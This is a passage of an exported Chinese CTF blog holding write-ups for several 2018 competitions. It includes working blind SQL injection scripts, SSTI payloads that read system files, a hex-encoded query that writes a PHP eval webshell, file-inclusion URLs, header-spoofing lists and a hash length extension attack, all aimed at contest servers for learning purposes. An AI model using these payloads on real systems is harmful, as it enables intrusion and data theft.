不想写了。。","categories":[],"tags":[]},{"title":"安恒七月月赛wp","slug":"安恒七月月赛wp","date":"2018-07-22T05:00:14.000Z","updated":"2018-07-29T14:44:16.934Z","comments":true,"path":"2018/07/22/安恒七月月赛wp/","link":"","permalink":"http://Merl1ng.com/2018/07/22/安恒七月月赛wp/","excerpt":"第一次赶上月赛时间","text":"第一次赶上月赛时间 这个昨天其实和巅峰极客撞了 去那边看了看web发现都是什么玩意orz 果断回来做月赛 题目比较照顾新人 做了四道 最后36名 crypto就一道密码学的 就先说了 比较简单 我这看了几天rsa的都能做出来 直接小明文攻击 12345678910111213141516171819202122232425#!/usr/bin/env python# -*- coding: utf-8 -*-import gmpy2,binascii,libnum,timen=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929e=3res=0c=0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365print time.asctime()def small_msg(e, n, c): print time.asctime(), \"Let's waiting...\" for k in xrange(200000000): if gmpy2.iroot(c + n * k, e)[1] == 1: print time.asctime(), \"...done!\" return gmpy2.iroot(c + n * k, 3)[0] for i in xrange(200000000): if gmpy2.iroot(c+n*i,3)[1]==1: res=gmpy2.iroot(c+n*i,3)[0] print i,res print libnum.n2s(res) print time.asctime() break web 1order注入 和之前的盲注语句还是有点区别 官方给的值直接sqlmap注的 我当时第一次用sqlmap 结果试了下没出来。。我就手注的 好吧 后来周赛复现题目时候又试了下sqlmap跑出来了 原来是当时用错了。。 在网上搜到的文章https://www.cnblogs.com/REscan/p/6884278.html 123456789猜解当前数据库的表名：/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00)) 正确/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误猜解指定表名中的列名：/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x69,1,0x00)) 正常/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x68,1,0x00)) 错误 然后注表名 列名 这个有点bug 出来是 flg 好像 猜了下应该是flag才对 还有这里不区分大小写 0x41 和 0x61一样判断 然后随手看了下源码 直接提示了 select flag from flag。。。。。。吐血 最后成功的脚本 (select+1+regexp+if(substring((select+flag+from+flag+limit+0,1),%s,1)=%s,1,0x00)) “%(i,j) 我试了试以前的 and ^ &amp;之类的盲注没成功 搜了下还可以利用 rand 不过我这也大概试了下没成http://www.cnblogs.com/lcamry/p/5762710.html 12345678910111213141516171819202122232425262728# -*- coding:utf8 -*-import requestsflag = &quot;&quot;url = &quot;http://101.71.29.5:10004/?order=&quot;str = &quot;flag&#123;666_0RDORBY_YOU_CAN&#125;&quot;print(str.upper()) # 把所有字符中的小写字母转换成大写字母print(str.lower()) for i in range(1,500): for j in range(46,127): j=hex(j) # print j payload=&quot;(select+1+regexp+if(substring((select+flag+from+flag+limit+0,1),%s,1)=%s,1,0x00)) &quot;%(i,j) #payload=&quot;(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),%s,1)=%s,1,0x00))&quot;%(i,j) url1 = url+payload # print url1 s = requests.get(url=url1) # s = requests.get(item.text.strip()) #print &quot;i:&quot;,i,&quot;j:&quot;,j if &quot;ice-cream&quot; in s.content: print j #flag += chr(int(j)) # print flag break #666c61677b3636365f3052444f5242595f594f555f43414e7d 666_0RDORBY_YOU_CAN 666_0rderby_you_can web 2其实也是萌新题 但我绕了好久的弯路 题目让你输一个东西 源码可以看到 用了 rand产生随机数 然后一个你不知道的key 一起算md5 我一看诶呦这是不是随机数预测啊 写脚本写到一半发现 key没告诉你。。。。 然后我想0e碰撞 或许后端是== 就写脚本跑了下 跑的时候我让他打出每次的响应体（要不然一直空着难受） 这里其实还走了另一个弯路 就是它返回的特征语句是中文的 我py写中文就报错 网上查的方法试了没用。。 我直接算hash判断。。。（这里是自己算的hash不是题目返回的） 但这里结果一看 短时间内相邻几次题目返回的md5都一样(你输错的话它会返回当时正确的md5)(后来官方说是linux下以秒为单位导致的漏洞) 这一看拼手速吗 写了个脚本 但不会正则抓md5 就用了以前sql看到的方法 x.content[198:230] 一点一点把区间找出来 12345678910111213141516171819#!/usr/bin/env pythonimport requestsflag = \"\"url = \"http://101.71.29.5:10003/flag.php\"tt=1while(1): data = &#123;'answer':'0e830400451993494058024219903391'&#125; s = requests.post(url,data=data).content[198:230] print s payload=s data = &#123;'answer':payload&#125; ss = requests.post(url,data=data).content # if 'em' not in s : print ss break web3flash触发csrf 挺难的 复现这题先搭了下环境 vps上安装httpd开启http服务 然后 tail命令可以查看日志 tail -f /var/log/httpd/access_log 哇2.5$的不给ipv4了只能买5$的真的贵 心疼 文件传输用的 scp命令 scp C:/Users/Saber/Desktop/exp5.html root@vps:/var/www/html 又学了下nc监听端口 这里要先让防火墙允许端口的访问 iptables -I INPUT -p TCP –dport 233 -j ACCEPT nc -lvvp 233 然后这里还有个大坑 windows改的swf文件头是不行的 好像只有mac下才可以 最后用出题人给的改好的swf才打到flag payload在readme里有 并不是自己填东西生成的 因为点那个log only不会显示日志 显得是另外一种payload 打不到flag的 http://vps/exp.html?objfile=http://127.0.0.1/upload/1ae8ac510d334c8db91699cbc30b4fe3.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1 最后终于打到了flag misc1图片 提示刷新 想到之前做过的f5隐写 跑下脚本 得一个文件 看文件头是zip 然后伪加密拿flag misc2这题做的歇逼了 题目直说弱口令 给了个压缩包 这一看爆破啊 梭哈啊 结果能跑的字典全跑了 没出来。。。。。 再看题目 有一段话把首字母提出来是lsb ？？？？我发现了什么不得了的东西 搜一下zip好像没lsb啊。。。。。。。。。 赛后了解到 压缩包注释里有不可见字符 转hex转摩斯 得压缩包密码 是个强密码。。。 解压后图片是 lsb 这里的密码是弱口令 123456 。。。。。。。。。。。。。。。。。 服气 lsb就那个xman上一样的脚本 不过学到了 压缩包注释里还能藏东西","categories":[],"tags":[]},{"title":"qctfwp","slug":"qctfwp","date":"2018-07-17T14:39:10.000Z","updated":"2018-07-24T14:30:07.190Z","comments":true,"path":"2018/07/17/qctfwp/","link":"","permalink":"http://Merl1ng.com/2018/07/17/qctfwp/","excerpt":"咸鱼好久不看题了","text":"咸鱼好久不看题了 https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/https://www.jianshu.com/p/55c5477567fe web1无waf的sql注入 没啥值得说的 web2当时猜的是条件竞争或者弱类型比较 .git或者robots泄露 拿源码 审计api.php发现php弱类型(刚开始我还以为js的弱类型 查了下并没有啥洞) json数组 改true即可 {“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]} web3先猜了下目录穿越 很显然要读文件 猜测python的ssti 不过题目伪装成php的站了 题目有一些waf需要绕过 12345&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;改为&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 也可以用cookies 之前一个国外的比赛是关键字中间+绕过的 这里应该也可以 py沙盒逃逸还得看 web4用到了jwt 这得好好学学 然后python反序列化https://blog.csdn.net/yanghuan313/article/details/65010925 misc 1ps补二维码 base32 misc 2先图片lsb隐写 带密码的要用脚本 misc 3一开始同上 用那个感觉并不常见的脚本 misc 4rsa1rsa2慢扫描电视orz","categories":[],"tags":[]},{"title":"sctfwp","slug":"sctfwp","date":"2018-06-22T14:27:26.000Z","updated":"2018-06-23T05:21:09.480Z","comments":true,"path":"2018/06/22/sctfwp/","link":"","permalink":"http://Merl1ng.com/2018/06/22/sctfwp/","excerpt":"web真是越出越难了orz","text":"web真是越出越难了orz https://xz.aliyun.com/t/2405?from=groupmessage&amp;isappinstalled=0#toc-25 https://blog.csdn.net/qq_38412357/article/details/80748214 https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485060&amp;idx=1&amp;sn=4cdf90c2aa831df45bae69710881b86e&amp;chksm=e89e2e5cdfe9a74a0ce3a053224c85e0d6b76d72142756521c5b90c0107d662908de6df48b59&amp;mpshare=1&amp;scene=23&amp;srcid=0622LlOhiYCADR45ARfuVGYu#rd https://www.jianshu.com/p/b940d0aaa9fa http://www.mamicode.com/info-detail-2344884.html misc相比较web misc还是比较友好的。。 神奇的modbus流量分析题目 输入modbus过滤协议 随便点一个追踪tcp流即可 经验值+1 肥宅快乐题swf文件 chrome/ie打开可玩 但难度太大 用爱奇艺万能播放器/Potplayer 倒着(因为提示通关给flag) 在第57帧看到被base64加密的flag 还有一种做法稍微麻烦 随便翻几帧 记录下NPC对话的特征，用反编译flash文件的工具打开，搜索project，可以定位至附近文本 侧信道初探结合给的代码对应图 分别是0 1。。这样看感觉好简单 但比赛时不一定想到orz 被动了手脚的数据提示modbus服务 使用了一款工具modbus-cli（https://github.com/tallakt/modbus-cli ）接收modbus协议的数据 尝试读取1000字节的数据，由于每次读取数据长度太长会导致timeout，因此每次只读取50字节 12345678#!/bin/bashstart=400001offset=50for ((i=$start; i&lt;=400001+1000; i+=50)) do modbus read --modicon 116.62.123.67 $i $offset sleep 1done 在400300-400331地址间有一段可疑数据 转hex转ascii 123456data = [21810, 18035, 25671, 22123, 22577, 11092, 26979, 26482, 22117, 18758, 14640, 18761, 30789, 28503, 12912, 28789, 13161, 12151, 26946, 13638, 30073, 26177, 29764, 29293, 11064, 31308, 21879, 27205, 20314, 13876, 26178, 13162] print len(data) flag=\"\" for i in range(len(data)): flag+=hex(data[i])[2:].decode('hex') print flag#U2FsdGVkX1+TicgrVeIF90IIxEoW2ppu3i/wiB5FuyfAtDrm+8zLUwjEOZ64fB3j 在线aes解密 神秘的交易给的文件是逻辑分析仪的数据包。所用工具应该为Saleae公司的logic软件（下载地址：http://downloads.saleae.com/logic/1.2.28/Logic+Setup+1.2.28.exe） 4442类芯片密码校验命令格式为： command word(8bit 0x33) index(8bit 01 02 03) pass(8bit)时钟高电平，数据下降沿，命令序列开始；时钟高电平 ，数据上升沿，命令序列结束。 用Saleae logic打开数据包 看图找序列 图片懒得放外链贴了 交易识破后的报复略复杂 还没看 webphpmyadmin首先尝试直接 outfile写一句话不行 select &#39;&lt;&gt;&#39; into outfile &#39;D:/phpstudy/www/merl1n.php&#39; 最简单的一道web 默认 root root进去 sql执行四行代码 3开日志 改日志路径 写一句话+1路径显示 然后连接菜刀 flag在c盘根目录 这里试了试蚁剑连不上 新的建议版很明显的xss 然鹅并不会做。。。 可以看源码，发现用了AnjularJS，百度Anjularjs的模板注入 参考文章地址：https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs 用eval(atob(“base64”))绕过各种过滤，如果使用16进制编码长度会超出限制 尝试带出cookie，发现并没有啥东西，想到应该是需要读文件。xss通常cookie没东西就要读文件 剩下的web还没看懂 有空补crypto这次有的crypto可以偷出来。。 it may contain ‘flag’yafu/http://factordb.com/ 尝试分解n 分不动 观察到e非常大，导致d会很小，使用低解密指数攻击。借助工具(https://github.com/pablocelayes/rsa-wiener-attack/blob/master/RSAwienerHacker.py) 跑出私钥d 直接脚本解密 12345c=0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3d=731297n=0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bfm=pow(c,d,n)print 'sctf&#123;'+hex(m)[2:len(hex(m))-1].decode('hex')+'&#125;' A Number Problem使用mathematica偷题。。否则你就得去看数论了 命令： solve[x^33==1926041757553905692219721422025224638913707,{x},Modulus-&gt;3436415358139016629092568198745009225773259] 群里有师傅直接在线解 因为都是一家的 话说这玩意当时学高数的时候还用过。。 补一个端午时候的一个比赛当时上去看了一下没做 https://www.jianshu.com/p/8df75a8c5c99","categories":[],"tags":[]},{"title":"suctfwp","slug":"suctfwp","date":"2018-05-28T13:33:10.000Z","updated":"2018-06-23T04:47:59.592Z","comments":true,"path":"2018/05/28/suctfwp/","link":"","permalink":"http://Merl1ng.com/2018/05/28/suctfwp/","excerpt":"周末做了点su rctf的当时没看 整理下","text":"周末做了点su rctf的当时没看 整理下 suctfhttp://bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/ https://findneo.tech/180527suctf web1php匿名函数 https://www.jianshu.com/p/19e3ee990cb7 hitcon的简化 除此之外匿名函数还有一个攻击点 https://paper.seebug.org/94/ 看了bendawanag的wp原来可以直接burp爆破匿名函数末位。。。 web2upload getshell 无字母数字的方式构造webshell 以前看过ph师傅的文章 比赛时没想起来 源码给了 12345678if($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"]))&#123; $data=substr($contents,5); foreach ($black_char as $b) &#123; if (stripos($data, $b) !== false)&#123; die(\"illegal char\"); &#125; &#125; &#125; 意思是从第六个字符起开始过滤 得先fuzz看下哪些没在黑名单里面 然后构造webshell MultiSql首先盲注拿到root用户 然后 load_file注入看文件 读 user.php 发现是用mysqli_multi_query()函数来进行sql语句查询的 可以多语句执行 读waf.php select被过滤 可以用 set和hex编码方式绕过 经过 into outfile方式将php文件写进网站目录 select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile ‘/var/www/html/favicon/wfox.php’ 再hex编码 set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t; http://www.bendawang.site/大师傅这里也非预期了 直接把shell写到了用户名里面 homework挺难的 但其实部分也没有超出知识体系 xxe和sql没想起来不应该 misc0base32 转ascii misc1x%a1=b1……x%a2=b20 求x 写python半自动跑了下 写的时候for 是不能无限int的 查了下while可以 每求两个再加的时候就加上这两个的最小公倍数 1234567x=103326966496273637783027077789967039569697458403while (x &lt; 1000000000000000000000000000000000000000000000000000000000000000000000000000): print x if(x%373==4): print x; break x =x+257*263*269*271*277*281*283*293*307*311*313*317*331*337*347*349*353*359*367 最后得到一串贼长的 转16进制再转ascii码 rctf2018https://xz.aliyun.com/t/2347 https://lorexxar.cn/2018/05/23/rctf2018/#r-cursive https://blog.csdn.net/Jerryzhu369/article/details/80432848 https://www.anquanke.com/post/id/145885 web考察偏重前端的知识点（xss） web ampcookie提示flag在admin的cookie 应该是xss 猜测使用AMP特性绕过csp打到cookie https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id web可以递归执行函数，不允许带参数?cmd=print(readdir(opendir(getcwd()))); 可以列目录?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件?cmd=print(dirname(dirname(getcwd()))); print出/var/www miscbinwalk发现红酒图片 wine misc gitgit revert misc Number GameGITHUB搜一搜 https://github.com/AustinGuo/GessNumber","categories":[],"tags":[]},{"title":"cstc&iscc-wp","slug":"cstc&iscc-wp","date":"2018-05-17T13:45:12.000Z","updated":"2018-05-28T13:32:44.366Z","comments":true,"path":"2018/05/17/cstc&iscc-wp/","link":"","permalink":"http://Merl1ng.com/2018/05/17/cstc&iscc-wp/","excerpt":"最近是真的忙 四天考了四门 好久没更了","text":"最近是真的忙 四天考了四门 好久没更了 cstc题目较友好一点 但像我这种菜鸡还是能学到不少东西 参考http://skysec.top/2018/05/12/2018年第四届全国网络空间安全技术大赛 web1懒得写了。。 web2misc1base64隐写 https://www.tr0y.wang/2017/06/14/Base64steg/ misc2题目提示可以在windows下解 想到ntfs doc隐藏 misc3流量包分析 icmp协议中的2个字符都在变化，其余均不变 iscc这个题目大多较简单 解密过的尝试大小写提交键盘下一行文件头文件尾aes 无秘钥 http://tool.oschina.net/encrypt/+/v++ 是代表utf-7 编码utf7 http://web2hack.org/xssee/ping http://poetichacker.com/writeup/%e7%94%b1iscc2018-web-ping%e5%ad%a6%e4%b9%a0%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5.htmlcbchttp://www.cnblogs.com/s1ye/p/9021202.html file 命令看见像base64的解一下总没错base 64 32 16全家桶R1VaREdNSlVHVTNVQ05KU0dRMlRNTkJVSVUyVEdOU0RHWTJESU9CVkdJMlRNTlpRR1UyVEtOSlRHQVpUS05DREdVWkRHTUJXR1EyVUNOQ0ZHUTNES01SVkdBMlRJTkpXRzRZREtOWlZHTTJUTU5TQ0c0NFRLTVJVR1kyRUtOQ0ZHVTNUTVFaVklFMkRRTkpYR1UzRE9NQlZHVTJUSU5KVkdNWVRNTUpWR1kzRUVOU0RHVkFUSVJCV0lNMlRNTkJVR1UyRE1RUlVJVTJEUU5KU0dNWVRPTUJVR00yVE1OQlZHWTJES01CVkdFM0VHTktCR1JBVEtOWlZHUTJFQ05CVkdVMkRHTUJUR0UzRENOSldHUTJUTU5CVkdZMkVJTlNDR1VaRElRWlZHUTJUS05DQkdVMlRLTVJUR0EyRE1OUlJHVTNESU5KVUlVMkVNTkpSR01ZREtRSlVIQTJUTU5KVUdSQVRJTVJWR0EyVElNWlFHTTRUS01CVkdFWlVJTTJF两轮全家桶 index.php.txt 备份文件。。那些说要本机ip的 一把梭 全加上X-Forwarded-For: 127.0.0.1Contact: 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Client-IP: 127.0.0.1Referer: 127.0.0.1From: 127.0.0.1X-Wap-Profile: 127.0.0.1True-Client-IP: 127.0.0.1Client-IP: 127.0.0.1 文件包含resource可以指定两个参数比如这种urlhttp://118.190.152.202:8006/show.php?img=1.jpg 最终的payload (../)http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phperror_reporting(0);ini_set('display_errors','Off');include('config.php');$img = $_GET['img'];if(isset($img) &amp;&amp; !empty($img))&#123; if(strpos($img,'jpg') !== false) &#123; if(strpos($img,'resource=') !== false &amp;&amp; preg_match('/resource=.*jpg/i',$img) === 0) &#123; die('File not found.'); &#125; preg_match('/^php:\\/\\/filter.*resource=([^|]*)/i',trim($img),$matches); if(isset($matches[1])) &#123; $img = $matches[1]; &#125; header('Content-Type: image/jpeg'); $data = get_contents($img); echo $data; &#125; else &#123; die('File not found.'); &#125;&#125;else&#123; ?&gt; &lt;img src=\"1.jpg\"&gt; &lt;?php&#125;?&gt; show.php|jpg./jpg/../show.phpcurl http://118.190.152.202:8006/show.php?img=./jpg/../show.php curl http://118.190.152.202:8006/show.php?img=./jpg/../../flag.php 变量覆盖12345678910111213141516171819202122232425&lt;?phpinclude \"flag.php\";if ($_SERVER[\"REQUEST_METHOD\"] != \"POST\") die(\"flag is here\");if (!isset($_POST[\"flag\"]) ) die($_403);foreach ($_GET as $k =&gt; $v)&#123; $$k = $$v;&#125;foreach ($_POST as $k =&gt; $v)&#123; $$k = $v;&#125;if ( $_POST[\"flag\"] !== $flag ) die($_403);//必须把原flag覆盖掉echo \"flag: \". $flag . \"\\n\";die($_200);?&gt; 当我们传入post的参数，因为参数名为flag，在第二个foreach中，$k为flag，所以$$k就为$flag，这个时候，原来的$flag变量就被覆盖掉，成为了自己赋的值。那么现在post参数没法动什么手脚。看到get参数那里有一点文章，$$k=$$v，如果我们传入get参数为_200=flag，那我们看一下，$$K就变成了$_200，而$$v就变成了$flag，最后的赋值语句就变成了$_200=$flag，我们成功将flag的值赋给了$_200，现在不管怎么样去覆盖flag的值，$_200总会将原来的$flag输出 hash长度扩展攻击1234567891011121314151617181920&lt;?phpinclude \"secret.php\";@$username=(string)$_POST['username'];function enc($text)&#123; global $key; return md5($key.$text);&#125;if(enc($username) === $_COOKIE['verify'])&#123; if(is_numeric(strpos($username, \"admin\")))&#123; die($flag); &#125; else&#123; die(\"you are not admin\"); &#125;&#125;else&#123; setcookie(\"verify\", enc(\"guest\"), time()+60*60*24*7); setcookie(\"len\", strlen($key), time()+60*60*24*7);&#125;show_source(__FILE__); 我们知道一个长度已知，数值未知的值\\$key，同时知道$key连接上一个已知的值(guest)的md5 值(看网页cookie)，需要满足\\$key 加上另一个可控的值(\\$username) 的MD5 等于一个已知的值 使用hashpumpInput Signature: xxxxxxxxxxxxxxxxxxxxxxxxxxxxInput Data: guestInput Key Length: 46Input Data to Add: admin 实验bar也有个类似的题https://blog.csdn.net/JBlock/article/details/78448143 相关资料https://blog.csdn.net/qq_35078631/article/details/70941204https://www.cnblogs.com/pcat/p/5478509.html 文件包含过滤php大小写绕过 Php://filter/read=convert.base64-encode/resource=index index.php-&gt;index 别人的wphttps://ox1234.github.io/2018/05/03/ISCC%202018%20wp/ https://mntn0x.github.io/2018/05/03/ISCC-2018-%E9%83%A8%E5%88%86wp/ 最后最后 补一个国赛wphttp://www.lovei.org/archives/ciscn2018.html","categories":[],"tags":[]},{"title":"少许ctfwp","slug":"少许ctfwp","date":"2018-04-16T14:01:31.000Z","updated":"2018-08-24T05:34:22.588Z","comments":true,"path":"2018/04/16/少许ctfwp/","link":"","permalink":"http://Merl1ng.com/2018/04/16/少许ctfwp/","excerpt":"wpictf + Midnight Sun CTF + ddctf + bctf + *ctf","text":"wpictf + Midnight Sun CTF + ddctf + bctf + *ctf WPICTFweb150给了个连接 一点就会跳到YouTube的一个视频 话说这个视频老外好像很喜欢啊。。。最近的ctf老是见到2333 这显然就是重定向了 抓包看看 发现有两个cookie 第一个好像是base64但拿去解密下是乱码 后一个显示的是 Julius C.=”got good dance moves.” 搜了下 Julius 提示词 Julius Caesar 就是凯撒 那么自然想到了 移位即rot加密 后来发现是 rot17 把第一个cookie rot17 再base64解密即可 web200 稍微试了下很显然是个sql 注册是不能用的 做的时候看到注释里的hash和salt跑偏了 以为是要注出来hash和salt 再跑字典。。。 而且还当盲注做把hash和salt跑出来了 但好像有点问题。。出现了:和{字符。。 还有这个用hackbar时要在login页面下否则报错 clientname =’ password=1 试了下 发现报错 而且页面回显了十分详细的错误信息 这点当时没有注意看 点击报错信息是可以展开看到相应源码的.. 这样便可以拿到部分关键源码 12345678search = \"\"\"SELECT id, hash, salt FROM clients WHERE clientname = '&#123;0&#125;' LIMIT 1\"\"\".format(clientname)pointer.execute(search)res = pointer.fetchone()if not res: return \"No such user in the database &#123;0&#125;!\\n\".format(clientname)userID, hash, salt = res 就是说注入的顺序是 id hash salt (这里要hash和salt用字符串就是””否则提示报错 那么思路就是随便输一个一直密码 猜测加密方式为sha256 把密码加密后作为salt输入 hash输入空字符串”” 当然你也可以随便写个盐 一起sha256 但是这里id不同得到的回显不一样 只有在id为2是才会显示flag 这个倒是可以试出来 如果id不对会给一个视频连接 估计又是那个视频2333 但是dalao给出了限制方法 就是 直接输 id 在后面加上 FROM clients WHERE clientname = ‘Goutham’ 至于这里为啥是Goutham因为首页上他的话里提到了密码。。 一个有趣的地方 之前说了我是当盲注写脚本跑的 由于很多函数都没有 mid ascii ord等等都没(我还试了试lctf上那几种跑错的函数也没有) 最后用了 &gt; 跑出来的 跑的时候发现从第二位开始是要把上一位先减一的 所以我以为在跑完后要把所有的加1 但是因为有字符9的存在 9+1的ascii码就是:了 显然加密中密文是不会出现这个东西的 所以我后来一度以为我的脚本有问题 然后看到了某个师傅用sqlmap跑出来的hash和salt发现只用把最后一位加1就行了(这点现在还是有点懵逼。。为啥最后一位要加1) https://rawsec.ml/en/WPICTF-2018-write-ups/#200-vault-web 然而拿到那三人的hash和salt也没用 这题出题人后来说不需要暴力 而是要欺骗数据库后 还是得用上面的方法解 不过可以使用一些软件比如hashid就可以识别出它的加密方式是sha256 就不用一个个去试可能的加密方式了 我当时写的脚本 12345678910111213141516171819import requestsurl = \"https://vault.wpictf.xyz/login\"#hash = \"ae6b2b347fd948b39a126e71decfc1cc411925a1ddc9f995949517d983fb027a\"#salt = \"leoczvd\"flag=\"leoc\"for i in range(1,500): for j in range(47,127): payload =\"Gaines ' or ((select salt from clients ) &gt; '%s') --+\"%(flag+chr(j)) data = &#123; \"password\":\"1\", \"clientname\":payload &#125; s = requests.post(url=url,data=data) if \"No\" in s.content: flag += chr(j-1) print flag #跑出来的flag最后一位ascii要加1 break Midnight Sun CTF Qualsweb200insert sql注入 这个思路挺奇特的 利用sql重置了root的密码 话说我insert的注入还不是很熟。。。 https://ctftime.org/writeup/9712 ddctfweb还是挺难的 听说题目平台开一年 最近也忙就先不仔细复现了 把一些大佬的wp的先收集一下 https://winter3un.github.io/2018/04/19/ddctf-2018/#web5http://hebic.me/2018/04/20/DDCTF2018-%E4%B8%93%E5%B1%9E%E9%93%BE%E6%8E%A5-writeup/http://www.lz1y.cn/https://www.wzsite.cn/2018/04/21/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4DDCTF/http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/https://clannad.me/ddctf.md.htmlhttp://sec2hack.com/ctf/ddctf-2018-web-writeup.htmlhttp://120.79.189.7/?p=287区块链https://xz.aliyun.com/t/2299 https://www.cnblogs.com/semishigure/p/8855134.htmlhttps://github.com/garzon/DDCTF_2018/tree/master/complex_stego web1先是绕过xff 主页中源码以八进制形式给了key 以及 main.js和main.js main.js经过了加密 解密得到 12345678910111213141516171819202122232425262728function signGenerate(obj, key) &#123; var str0 = ''; for (i in obj) &#123; if (i != 'sign') &#123; str1 = ''; str1 = i + '=' + obj[i]; str0 += str1 &#125; &#125; return hex_math_enc(str0 + key)&#125;;var obj = &#123; id: '', title: '', author: '', date: '', time: parseInt(new Date().getTime() / 1000)&#125;;function submitt() &#123; obj['id'] = document.getElementById('id').value; obj['title'] = document.getElementById('title').value; obj['author'] = document.getElementById('author').value; obj['date'] = document.getElementById('date').value; var sign = signGenerate(obj, key); document.getElementById('queryForm').action = \"index.php?sig=\" + sign + \"&amp;time=\" + obj.time; document.getElementById('queryForm').submit()&#125; math.js发现加密算法是sha1 index.php里还有这么一段 大体感觉像post里套了个get 123456789101112131415161718&lt;form id='queryForm' action=\"index.php\" method=\"post\"&gt; &lt;tr&gt; &lt;td width=\"60\"&gt; id: &lt;input type=\"text\" id=\"id\" name=\"id\" value=\"\" /&gt; &lt;td width=\"60\"&gt; title: &lt;input type=\"text\" id=\"title\" name=\"title\" value=\"\" /&gt; &lt;/td&gt; &lt;td width=\"60\"&gt; date: &lt;input type=\"text\" id=\"date\" name=\"date\" value=\"\"/&gt; &lt;/td&gt; &lt;td width=\"40\"&gt; &lt;input type=\"hidden\" id=\"author\" name='author' value=''/&gt; &lt;input type=\"submit\" name=\"button\" id=\"button\" value=\"search\" onclick=\"submitt()\"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/form&gt; 然后sql盲注 脚本比之前的稍微复杂了点 注入点比较隐蔽 可以看到又四个参数 但是搜索框只给了三个 没给的那个参数才是真正的注入点 123456789101112131415161718192021222324252627282930313233343536import requestsimport timeimport hashlibs = ''for index in range(1,0x20): for i in range(0x30,0x7f): id = \"\" title = \"\" date = \"\" author = \"-1'||if(ord(substr((select secvalue from ctf_key9 limit 0,1),\"+str(index)+\",1))=\"+str(i)+\",0,1)#\" # select * from content where id = ? and author = ' -1' || ' and date = ' = 'a' union ' #proxies = &#123;\"http\":\"127.0.0.1:8080\"&#125; data = &#123; \"id\":id, \"title\":title, \"author\":author, \"data\":date, \"button\":\"search\" &#125; t = str(int(time.time())) str0 = 